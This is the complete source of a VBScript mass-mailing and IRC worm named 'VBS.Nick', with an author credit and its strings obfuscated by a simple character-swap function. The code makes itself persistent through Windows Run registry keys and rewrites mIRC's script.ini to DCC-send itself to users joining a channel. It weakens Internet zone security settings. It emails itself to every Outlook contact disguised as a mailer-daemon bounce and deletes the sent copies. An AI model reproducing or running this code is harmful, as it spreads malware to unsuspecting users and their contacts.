'VBS.Nick
'Author: Total K [CM]
'Origin: UK
'Dedicated to Nick Fitzgerald.. friggin muppet! ;)
On Error Resume Next
Dim F1,W1,D1,R1,M1,M2,M3,V1,V2,O1,A1,A2,A3,N1
Set F1=CreateObject(E("Rbshquhof/GhmdRxrudlNckdbu"))
Set W1=createObject(E("VRbshqu/Ridmm"))
D1=F1.GetSpecialFolder(0)
R1=W1.RegRead(E("IJDX^MNB@M^L@BIHOD]RNGUV@SD]Lhbsnrngu]Vhoenvr]BtssdouWdsrhno]Wdsrhno"))
If Not R1="" Then
W1.RegWrite(E("IJDX^MNB@M^L@BIHOD]RNGUV@SD]Lhbsnrngu]Vhoenvr]BtssdouWdsrhno]Sto]@ouhWhstr")),(E("vrbshqu/dyd!"))&D1&(E("]`w/wcr"))
W1.RegWrite(E("IJDX^MNB@M^L@BIHOD]RNGUV@SD]Lhbsnrngu]Vhoenvr]BtssdouWdsrhno]Sto]Ohbj")),(E("vrbshqu/dyd!"))&D1&(E("WCR/Ohbj!,!cx;!Unu`m!J!ZBL\"))
Else
R1=W1.RegRead(E("IJDX^MNB@M^L@BIHOD]RNGUV@SD]Lhbsnrngu]Vhoenvr!OU]BtssdouWdsrhno]QsnetbuO`ld"))
If Not R1="" Then
W1.RegWrite(E("IJDX^MNB@M^L@BIHOD]RNGUV@SD]Lhbsnrngu]Vhoenvr]BtssdouWdsrhno]Sto]@ouhWhstr")),(E("vrbshqu/dyd!"))&D1&(E("]`w/wcr"))
W1.RegWrite(E("IJDX^MNB@M^L@BIHOD]RNGUV@SD]Lhbsnrngu]Vhoenvr]BtssdouWdsrhno]Sto]Ohbj")),(E("vrbshqu/dyd!"))&D1&(E("WCR/Ohbj!,!cx;!Unu`m!J!ZBL\"))
End If
End If
F1.CopyFile WScript.ScriptFullName,D1&(E("]`w/wcr"))
F1.CopyFile WScript.ScriptFullName,D1&(E("]`uu`bildou/wcr"))
Set N1=F1.CreateTextFile(D1&(E("]ohbj/wcr")),True)
N1.WriteLine(E("Ui`ojr!&Ohbj!Ghu{fds`me&!gns!uihr!nod!:(")),4144,(E("WCR/Ohbj"))
N1.Close
If (F1.FileExists(E("B;]lHSB]rbshqu/hoh"))) Then
Set M1=F1.OpenTextFile(E("B;]lHSB]rbshqu/hoh",2))
M1.WriteLine(E("Zrbshqu\"))
M1.WriteLine(E(":WCR/Ohbj!,!Bnede!cx;!Unu`m!Jnogt{hno!ZBL\"))
M1.WriteLine(E(":"))
M1.WriteLine(E("o1<no!0;KNHO;#;z"))
M1.WriteLine(E("o0<!.hg!)!%ohbj!<<!%ld!(!z!i`mu!|"))
M1.WriteLine(E("o3<!./ebb!rdoe!%ohbj!"))&D1&(E("]`w/wcr"))
M1.WriteLine(E("o2<|"))
M1.Close()
End If
W1.RegWrite(E("IJDX^BTSSDOU^TRDS]Rnguv`sd]Lhbsnrngu]Vhoenvr]BtssdouWdsrhno]Houdsodu!Rduuhofr][nodr]1]0310")),0,(E("SDF^EVNSE"))
W1.RegWrite(E("IJDX^MNB@M^L@BIHOD]Rnguv`sd]Lhbsnrngu]Vhoenvr]BtssdouWdsrhno]Houdsodu!Rduuhofr][nodr]1]0310")),0,(E("SDF^EVNSE"))
Set O1=CreateObject(E("Ntumnnj/@qqmhb`uhno"))
If (E(O1))="Ntumnnj" Then
Set M2=O1.GetNameSpace(E("L@QH"))
For Each A1 In M2.AddressLists
If A1.AddressEntries.Count<>0 Then
A2=A1.AddressEntries.Count
For A3=1 To A2
Set A3=A1.AddressEntries(A3)
Set M3=O1.CreateItem(0)
M3.To=A3.Address
M3.Subject=(E("L@HMDS,EDLNO;!Tojonvo!Sdbhqhdou"))
M3.Body=(E("d,l`hm!sdutsode;!Tojonvo!Sdbhqhdou"))
M3.Attachments.Add=D1&(E("]`uu`bildou/wcr"))
M3.DeleteAfterSubmit=True
If Not M3.To="" Then
M3.Send
End IF
Next
End If
Next
End If
Function E(B)
For X=1 To Len(B)
S=Mid(B,X,1)
If Asc(S)<>34 And Asc(S)<>35 Then
If Asc(S) Mod 2=0 Then
S=Chr(Asc(S)+1)
Else
S=Chr(Asc(S)-1)
End If
End If
E=E&S
Next
End Function
